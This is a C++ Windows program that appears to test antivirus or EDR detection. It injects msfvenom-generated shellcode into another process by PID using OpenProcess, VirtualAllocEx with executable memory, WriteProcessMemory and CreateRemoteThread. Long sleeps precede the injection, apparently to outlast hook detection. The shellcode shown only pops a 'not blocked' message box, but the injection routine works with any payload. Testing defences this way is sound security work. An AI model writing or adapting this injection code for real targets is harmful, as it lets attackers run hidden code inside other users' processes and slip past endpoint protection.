#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include <iostream>
#include <Windows.h>

int main(int argc, char* argv[])
{
	printf("Compile time (for unique compilation): %s\n", __TIME__);
	printf("Waiting for some time to allow UH technique and detection of hooks...\n");
	Sleep(9000);
	Sleep(9000);
	Sleep(9000);
	Sleep(9000);
	Sleep(9000);
	Sleep(9000);
	Sleep(9000);
	Sleep(9000);
	Sleep(9000);
	Sleep(9000);

	unsigned char buf5[] =
		
		//Messagebox OS3 generated using msfvenom:		
		"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
		"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
		"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
		"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
		"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
		"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
		"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
		"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
		"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
		"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
		"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
		"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
		"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
		"\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
		"\x85\x27\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
		"\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x54\x68\x69"
		"\x73\x20\x69\x6e\x6a\x65\x63\x74\x65\x64\x20\x6d\x65\x73\x73"
		"\x61\x67\x65\x62\x6f\x78\x20\x69\x73\x20\x6e\x6f\x74\x20\x62"
		"\x6c\x6f\x63\x6b\x65\x64\x2e\x00\x4f\x53\x33\x20\x44\x65\x6d"
		"\x6f\x00";


	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;
	
	int pid = atoi(argv[1]);
	printf("Injecting into PID : %i... ", pid);
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
	if (processHandle == 0)
	{
		printf("ERROR: Proc hand 0");
		return -1;
	}
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof buf5, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (remoteBuffer == 0)
	{
		printf("ERROR: Remote buf 0");
		return -1;
	}
	SIZE_T lpNumberOfBytesWritten;
	
	WriteProcessMemory(processHandle, remoteBuffer, buf5, sizeof buf5, &lpNumberOfBytesWritten);
	if (lpNumberOfBytesWritten != (sizeof buf5))
	{
		printf("ERROR: Written %d", lpNumberOfBytesWritten);
		return -1;
	}
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); //The one that should trigger AV
	if (remoteThread == 0)
	{
		printf("ERROR: Remote thr 0");
		return -1;
	}
	CloseHandle(processHandle);
	Sleep(9000);
	printf("Done.\n");
	return 0;
}
